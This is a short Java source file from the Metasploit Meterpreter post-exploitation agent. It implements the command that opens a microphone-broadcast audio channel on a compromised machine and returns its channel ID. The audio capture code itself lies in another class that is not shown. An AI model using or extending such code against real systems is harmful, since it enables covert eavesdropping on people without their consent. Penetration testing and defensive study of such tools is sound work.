package com.metasploit.meterpreter.stdapi;

import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;

import com.metasploit.meterpreter.Channel;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.AudioSocketChannel;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class channel_create_stdapi_net_mic_broadcast implements Command {
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        // If we got here, the connection worked, respond with the new channel ID
        Channel channel = new AudioSocketChannel(meterpreter, null, null);
        channel.startInteract();
        response.add(TLVType.TLV_TYPE_CHANNEL_ID, channel.getID());
        return ERROR_SUCCESS;
    }
}
